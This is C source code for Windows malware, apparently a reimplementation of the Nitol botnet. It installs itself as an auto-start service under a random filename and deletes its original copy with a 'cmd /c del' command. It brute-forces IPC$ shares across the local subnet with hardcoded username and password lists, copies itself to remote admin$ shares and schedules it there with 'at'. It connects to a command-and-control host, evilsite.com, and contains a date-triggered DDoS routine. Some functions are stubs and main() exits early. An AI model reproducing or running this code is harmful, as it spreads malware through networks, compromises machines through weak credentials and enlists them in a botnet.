#include "Nitol.h"
#pragma comment(lib, "ws2_32.lib")
#include <time.h>
#include<string.h>
#define SHCNE_DELETE 4
#define SHCNF_PATH 1
#define WINSOCK_VERSION 0x202
#define VER_NT_WORKSTATION 0x1
#define MAX_THREADS 100


BOOL is_service_installed()
{
	HKEY phkResult;
	HMODULE hadvapi = LoadLibraryA("advapi32.dll");
	PFN_RegCloseKey RegCloseKey = (PFN_RegCloseKey)::GetProcAddress (hadvapi, "RegCloseKey");
	char SubKey [100] = "SYSTEM\\CurrentControlSet\\Services\\\\";
	strcat(SubKey, "Vwxyab Defghijk Mno");
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, KEY_ALL_ACCESS, &phkResult);
	if (phkResult==0)
		return FALSE;
	else
		return TRUE;
	RegCloseKey(phkResult);
}

int self_delete()
{
	HMODULE hkernel = LoadLibraryA("kernel32.dll");
	FARPROC lstrcatA = GetProcAddress(hkernel, "lstrcatA");
	HMODULE hshell = LoadLibraryA("Shell32.dll");
	FARPROC SHChangeNotify = GetProcAddress(hshell, "SHChangeNotify");
	char buffer [MAX_PATH];
	char filename [MAX_PATH];
	char param [100];
	char szOpen [5] = "Open";
	memset(filename, 0, MAX_PATH);
	memset(param, 0, 100);
	GetModuleFileNameA(0, filename, MAX_PATH);
	GetShortPathNameA(filename, filename, MAX_PATH);
	GetEnvironmentVariableA("COMSPEC", buffer, MAX_PATH);
	((void (__stdcall *)(CHAR [], CHAR []))lstrcatA)(param, "/c del ");	
	((void (__stdcall *)(CHAR [], CHAR []))lstrcatA)(param, filename);
	((void (__stdcall *)(CHAR [], CHAR []))lstrcatA)(param, " >nul");
	SHELLEXECUTEINFOA pExecInfo;
	pExecInfo.lpVerb = szOpen;
	pExecInfo.lpFile = buffer;
	pExecInfo.cbSize = 60;
	pExecInfo.hwnd = 0;
	pExecInfo.lpParameters = param;
	pExecInfo.lpDirectory = 0;
	pExecInfo.nShow = 0;
	pExecInfo.fMask = 64;
	if ( !ShellExecuteExA(&pExecInfo) )
		return 0; 
	SetPriorityClass(pExecInfo.hProcess, IDLE_PRIORITY_CLASS);
	HANDLE hProcess = GetCurrentProcess();
	SetPriorityClass(hProcess, REALTIME_PRIORITY_CLASS);
	HANDLE hThread = GetCurrentThread();
	SetThreadPriority(hThread, 15);
	((void (__stdcall *)(DWORD, DWORD, CHAR[], DWORD))SHChangeNotify)(SHCNE_DELETE, SHCNF_PATH, filename, 0);
	return 1;
}

char random_char(int x)
{
	HMODULE hkernel = LoadLibraryA("KERNEL32.dll");
  	FARPROC GetTickCount = GetProcAddress(hkernel, "GetTickCount");
  	int value = GetTickCount();
  	return value * (rand() + 3) % x;
}

void install_malware(char svcname[], char svcdisplayname[], char regvalue[])
{
	HKEY phkResult=NULL;
	char Filename [MAX_PATH];
	char Buffer [MAX_PATH];
	HMODULE hadvapi = LoadLibraryA("ADVAPI32.dll");
	FARPROC RegCloseKey = GetProcAddress(hadvapi, "RegCloseKey");
	FARPROC OpenSCManagerA = GetProcAddress(hadvapi, "OpenSCManagerA");	  
	FARPROC OpenServiceA = GetProcAddress(hadvapi, "OpenServiceA");	  
	FARPROC CloseServiceHandle = GetProcAddress(hadvapi, "CloseServiceHandle");
	HMODULE hkernel = LoadLibraryA("KERNEL32.dll");
	FARPROC CopyFileA = GetProcAddress(hkernel, "CopyFileA");	
	FARPROC RegSetValueExA = GetProcAddress(hadvapi, "RegSetValueExA");	  
	FARPROC StartServiceA = GetProcAddress(hadvapi, "StartServiceA");	  
	FARPROC RegOpenKeyA = GetProcAddress(hadvapi, "RegOpenKeyA");	  
	FARPROC UnlockServiceDatabase = GetProcAddress(hadvapi, "UnlockServiceDatabase");	  
	FARPROC ChangeServiceConfig2A = GetProcAddress(hadvapi, "ChangeServiceConfig2A");	  
	FARPROC CreateServiceA = GetProcAddress(hadvapi, "CreateServiceA");	  
	FARPROC LockServiceDatabase = GetProcAddress(hadvapi, "LockServiceDatabase");
	memset(&Filename, 0, MAX_PATH);
	memset(&Buffer, 0, MAX_PATH);
	GetModuleFileNameA(0, Filename, MAX_PATH);
  	GetWindowsDirectoryA(Buffer, MAX_PATH);

	int BufLen = strlen(Buffer);
	char random_name [7];
	memset(random_name, 0, 7);
	if ( strncmp(Buffer, Filename, BufLen))
	{
		char v16 = random_char(26) + 'a';
		char v17 = random_char(26) + 'a';
		char v18 = random_char(26) + 'a';
		char v19 = random_char(26) + 'a';
		char v20 = random_char(26) + 'a';
		char v21 = random_char(26);
		wsprintfA(random_name, "%c%c%c%c%c%c.exe", v21 + 'a', v20, v19, v18, v17, v16);
		strcat(Buffer, "\\");	
		strcat(Buffer, random_name);		
		((void (__stdcall *)(CHAR [], CHAR [], int))CopyFileA)(Filename, Buffer, 0);
		memset(&Filename, 0, MAX_PATH);
		strcpy(Filename, Buffer);
	}
	int schSCManager = ((int (__stdcall *)(DWORD, DWORD, DWORD))OpenSCManagerA)(0, 0, SC_MANAGER_ALL_ACCESS);	
	int schManager = 0;
	schManager = schSCManager;
	if (schSCManager)
	{			
		int schService = ((int (__stdcall *)(int, CHAR [], CHAR[], DWORD, DWORD, DWORD, DWORD, CHAR [], DWORD, DWORD, DWORD, DWORD, DWORD))CreateServiceA)(schSCManager, svcname, svcdisplayname, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, Filename, 0, 0, 0, 0, 0);
		int lpInfo = 86400;
		char * desc_new  = "Vwxyabcd Fghijklmn Pqrstuv Xyabcdef Hip";
		int hLockServ = ((int (__stdcall *)(int))LockServiceDatabase)(schSCManager);
		((void (__stdcall *)(int, signed int, char **))ChangeServiceConfig2A)(schService, 1, &desc_new);	
		((void (__stdcall *)(int))UnlockServiceDatabase)(hLockServ);
		if (!schService && GetLastError() == 1073)
		{
			int SCHANDLE = ((int (__stdcall *)(int, CHAR [], int))OpenServiceA)(schManager, svcname, SERVICE_ALL_ACCESS);
			schService = SCHANDLE;
			if ( !SCHANDLE )
				goto EXIT;
			((void (__stdcall *)(int, DWORD, DWORD))StartServiceA)(SCHANDLE, 0, 0);
		}
		if (!((int (__stdcall *)(int, DWORD, DWORD))StartServiceA)(schService, 0, 0))
		{
			goto EXIT;
		}
		else
		{
			char buf [100] = "SYSTEM\\\\CurrentControlSet\\\\Services\\\\";
			strcat(buf, svcname);
			int reglength = strlen(regvalue);
			((void (__stdcall *)(HKEY, CHAR [], PHKEY))RegOpenKeyA)(HKEY_LOCAL_MACHINE, buf, &phkResult);
			((int (__stdcall *)(HKEY, CHAR [], DWORD, DWORD, CHAR [], DWORD))RegSetValueExA)(phkResult, "Description", 0, 1, regvalue, reglength);
		}
		EXIT:
		if ( schService )
			((void (__stdcall *)(int))CloseServiceHandle)(schService);
		if ( schManager )
			((void (__stdcall *)(int))CloseServiceHandle)(schManager);
		if ( phkResult!=NULL)
			((void (__stdcall *)(HKEY))RegCloseKey)(phkResult);	
		self_delete();		
	}
}

void T_brutefource(LPVOID lpThreadParameter)
{
	char * username[] = {"adminuser", "administrator","test","admin", "guest","alex","home","love","xp","user","game","123","nn","root","????????????","movie","time","yeah","money","xpuser","hack","enter", ""};
	char * pass[] = {"password","111", "123", "222", "123456","qwerty","test","abc123","memory","home","12345678","love","bbbbbb","xp","88888","nn","root","caonima","5201314","1314520","asdfgh","alex","angel","NULL","123","asdf","baby","woaini","movie", ""};	
	struct WSAData WSAData; 
	WSAStartup(WINSOCK_VERSION, &WSAData);	
	if (LOBYTE(WSAData.wVersion) == 2 && HIBYTE(WSAData.wVersion) == 2)
	{
		CHAR name [100];
		CHAR ip_addr[20];
		CHAR Dest[80];
		int index =0;		
		struct hostent *hostname;
		memset(name, 0, 100);
		unsigned __int8 ipaddr[3];
		HMODULE hmpr = LoadLibraryA("mpr.dll");		
		HMODULE hkernel = LoadLibraryA("kernel32.dll");		
		FARPROC WNetAddConnection2A = GetProcAddress(hmpr, "WNetAddConnection2A");
		FARPROC CopyFileA = GetProcAddress(hkernel, "CopyFileA");	
		struct _SYSTEMTIME SystemTime;
		if(!gethostname(name, 100))
		{
			hostname = gethostbyname(name);	
			if(hostname && hostname->h_addr_list)
			{				
				while (index<256)
				{
					memset(ip_addr, 0, 80);
					memset(Dest, 0, 80);
					int i=0,j=0;
					CHAR Cmdline[MAX_PATH];
					CHAR Filename[MAX_PATH];
					NETRESOURCE NetR;
					memset(Cmdline, 0 , MAX_PATH);
					index++;
					memcpy(&ipaddr, *(const void **)hostname->h_addr_list, hostname->h_length);
					sprintf(ip_addr, "%d.%d.%d.%d", ipaddr[0], ipaddr[1], ipaddr[2], index);					
					for(i=0;username[i]!="";i++)
						for(j= 0; pass[j]!=""; j++)
							{																										
								//printf("[%d]\t%s %s %s\n", index,ip_addr, username[i], pass[j]);
								//lstrcpyA(ip_addr, "10.73.1.6");
								//lstrcpyA(username[i], "adminuser");
								sprintf(Cmdline, "\\\\%s\\ipc$", ip_addr);
								memset(&NetR, 0, sizeof(NetR));								
								NetR.lpRemoteName = Cmdline;								
								NetR.dwScope = RESOURCE_CONNECTED;
								NetR.dwType = RESOURCETYPE_ANY;
								NetR.dwDisplayType = RESOURCETYPE_ANY;
								NetR.dwUsage = RESOURCEUSAGE_CONNECTABLE;								
								DWORD dwResult = ((DWORD (__stdcall *)(LPNETRESOURCE, CHAR [], CHAR[], DWORD))WNetAddConnection2A)(&NetR, pass[j], username[i], 0);
								
								if(dwResult == ERROR_ALREADY_ASSIGNED)
								{
									continue;
								}
								else if(dwResult == ERROR_DEVICE_ALREADY_REMEMBERED){
									continue;
								}
								else if(dwResult != NO_ERROR)
									continue;								
								else
								{
									printf("\tSuccessed! IP: %s, Username: %s, Password: %s\n", ip_addr, username[i], pass[j]);
									GetModuleFileNameA(0, Filename, MAX_PATH);
									sprintf(Cmdline, "\\\\%s\\admin$\\NewArean.exe", ip_addr);
									if (((BOOL (__stdcall *)(CHAR [], CHAR [], int))CopyFileA)(Filename, Cmdline, 0))
									{
										GetLocalTime(&SystemTime);
										memset(Cmdline, 0, 1028);
										sprintf(Cmdline, "at \\\\%s %d:%d %s", ip_addr, SystemTime.wHour, SystemTime.wMinute + 2, "C:\\NewArean.exe");
										WinExec(Cmdline, 0);
										printf("%s\n", Cmdline);
										Sleep(1000);
										return;
									}
									return;
								}								
							}
				}
				
            }
		}
	}
	exit(1);

}

int conect_C2()
{
	WSADATA wsaData;
    int iResult;
	hostent *host;
	SOCKET ConnectSocket;
	char *ip;
	BOOL bOptVal = FALSE;
	int bOptLen = sizeof (BOOL);
	int iOptVal = 0;
    int iOptLen = sizeof (int);

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	char *hostname = "evilsite.com";
	host = gethostbyname(hostname);		
	ip = inet_ntoa(*(struct in_addr *) *host->h_addr_list);
    if (iResult != NO_ERROR)
	{
        printf("WSAStartup function failed with error: %d\n", iResult);
		WSACleanup();
        return -1;
    }
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;	
    clientService.sin_addr.s_addr = inet_addr(ip);
    clientService.sin_port = htons(1234);
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	iResult = connect(ConnectSocket, (SOCKADDR *) & clientService, sizeof (clientService));
    if (iResult != -1) 
	{
		bOptVal = TRUE;
		iResult = setsockopt(ConnectSocket, SOL_SOCKET, SO_KEEPALIVE, (char *) &bOptVal, bOptLen);
		send(ConnectSocket, "lihaoa", 7, 0);
	}
	closesocket(ConnectSocket);
	WSACleanup();
	return -1;

}


void GetSysInfo(char * Buffer, DWORD BufSize)
{
	char buffer[1000];
	char version[40];
	SYSTEM_INFO info;
    OSVERSIONINFO os;	
	memset(buffer, 0, 1000);
	GetSystemInfo(&info);
	os.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);
	GetVersionEx(&os); 
	if(os.dwPlatformId == 2) //Æ½Ì¨ID
    {
        if(os.dwMajorVersion == 6 && os.dwMinorVersion == 1)
		{
			//printf("Win7 %s\n", os.szCSDVersion);  //²¹¶¡°ü
			sprintf(version, "Windows 7 %s", os.szCSDVersion);
		}	
		else if(os.dwMajorVersion==5 && os.dwMinorVersion==2)
            //printf("Windows 2003 \n");
			sprintf(version, "Windows 2003");
        else if(os.dwMajorVersion == 5 && os.dwMinorVersion == 1) //Ö÷°æ±¾ºÅ£¬´Î°æ±¾ºÅ
            //printf("Windows XP %s \r\n", os.szCSDVersion);  
			sprintf(version, "Windows XP %s", os.szCSDVersion);
        else if(os.dwMajorVersion == 5 && os.dwMinorVersion == 0)
            //printf("Windows 2000 \r\n");
			sprintf(version, "Windows 2000");
        else
            //printf("Windows other\n");
			printf("Windows other\n");
    }
	printf("Windows ver: %s\n", version);
}

SOCKET T_DDoS_attack()
{
	SOCKET result; 
	char buf[4];
	int iResult = conect_C2();
	if(iResult)
	{
		 *(DWORD *)buf = 0xB0;
	}
	return result; 
}



int T_DDoS()
{	
	struct WSAData WSAData;
	WSAStartup(WINSOCK_VERSION, &WSAData);
	while ( 1 )
	{
		time_t rawtime;
		struct tm *nowtime;
		char buffer[80];
		time(&rawtime);	
		nowtime = localtime(&rawtime);
		sprintf(buffer, "%04d%02d%02d",  nowtime->tm_year+1900, nowtime->tm_mon + 1, nowtime->tm_mday);		
		if ( atoi(buffer) > 20130221 )
			break;
		Sleep(500);
  }
	HANDLE hObject = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)T_DDoS_attack, 0, 0, 0);
	WaitForSingleObject(hObject, 0xFFFFFFFF);
	CloseHandle(hObject);
	return 0;
}

SOCKET T_C2_connection()
{
	SOCKET result; 
	return result;
}

HANDLE _CreateThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)
{
	return CreateThread(0, 0, lpStartAddress, lpParameter, 0, 0);
}

int run_malware()
{	
	struct WSAData WSAData;
	DWORD dword_401C04;
	HMODULE hws2 = LoadLibrary("WS2_32.dll");
	HMODULE hkernel = LoadLibrary("kernel32.dll");
	FARPROC closesocket = GetProcAddress(hws2, "closesocket");
	HMODULE hadvapi = LoadLibrary("ADVAPI32.dll");
	FARPROC SetServiceStatus = GetProcAddress(hadvapi, "SetServiceStatus");	
	FARPROC RegisterServiceCtrlHandlerA = GetProcAddress(hadvapi, "RegisterServiceCtrlHandlerA");	
	DWORD dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	((void (__stdcall *)(DWORD, DWORD *))SetServiceStatus)(0, &dwServiceType);
	FARPROC CreateMutexA = GetProcAddress(hkernel, "CreateMutexA");
	if (((int (__stdcall *)(DWORD, DWORD, CHAR []))CreateMutexA)(0, 0, "Vwxyab Defghijk Mno") && GetLastError()==ERROR_ALREADY_EXISTS)
	{
		exit(0);
	}
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)T_brutefource, 0, 0, 0);
	Sleep(1000);
	WSAStartup(WINSOCK_VERSION, &WSAData);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)T_DDoS, 0, 0, 0);
	while ( 1 )
	{
		HANDLE hThread = _CreateThread((LPTHREAD_START_ROUTINE)T_C2_connection, 0);
		WaitForSingleObject(hThread, 0xFFFFFFFF);
		CloseHandle(hThread);
		//closesocket(fd);
		dword_401C04 = 1;
		Sleep(1000);
  }
	return 1;
}


int main()
{	
	//T_DDoS();
	char Buffer[1000];
	memset(Buffer, 0, 1000);
	GetSysInfo(Buffer, 1000);
	printf("%s\n", Buffer);
	exit(1);

	HMODULE hkernel = LoadLibraryA("kernel32.dll");
	HMODULE huser = LoadLibraryA("user32.dll");			
	PFN_GetLastError GetLastError = (PFN_GetLastError)::GetProcAddress (hkernel, "GetLastError");
	PFN_ExitProcess myExitProcess = (PFN_ExitProcess)::GetProcAddress (hkernel, "ExitProcess");
	PFN_MessageBox myMessageBox = (PFN_MessageBox)::GetProcAddress (huser, "MessageBoxA");

	SERVICE_TABLE_ENTRYA  ServiceStartTable;
	char buffer[260] ;
	memset(&buffer, 0, sizeof(buffer));
	HMODULE hModule= GetModuleHandleA(0);
	GetModuleFileNameA(hModule, buffer, sizeof(buffer));
	HMODULE hadvapi = LoadLibraryA("ADVAPI32.dll");	
	if(is_service_installed()==TRUE)
	{
		run_malware();
		ServiceStartTable.lpServiceName = "Vwxyab Defghijk Mno";
		ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)run_malware;				
		((void (__stdcall *)(SERVICE_TABLE_ENTRYA *))StartServiceCtrlDispatcherA)(&ServiceStartTable);		
	}
	else
		install_malware("Vwxyab Defghijk Mno", "Vwxyab Defghijk Mnopqrst Vwxy", "Vwxyabcd Fghijklmn Pqrstuv Xyabcdef Hij");
		
	return 0;
}